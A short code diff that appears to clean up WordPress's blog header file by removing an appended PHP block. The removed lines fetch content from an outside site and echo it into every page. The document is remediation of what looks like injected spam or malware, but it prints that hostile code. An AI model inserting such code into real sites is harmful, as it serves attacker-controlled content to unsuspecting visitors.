@@ -18,10 +18,5 @@ if (!isset($wp_did_header)) {
     // Load the theme template.
     require_once ABSPATH . WPINC . '/template-loader.php';
 }
-?>
-<?php
-$b = file_get_contents('https://seotwinkle.site/littlestar/');
-echo $b;
-$a = file_get_contents('https://seotwinkle.site/lain/');
-echo $a;
+
 ?>
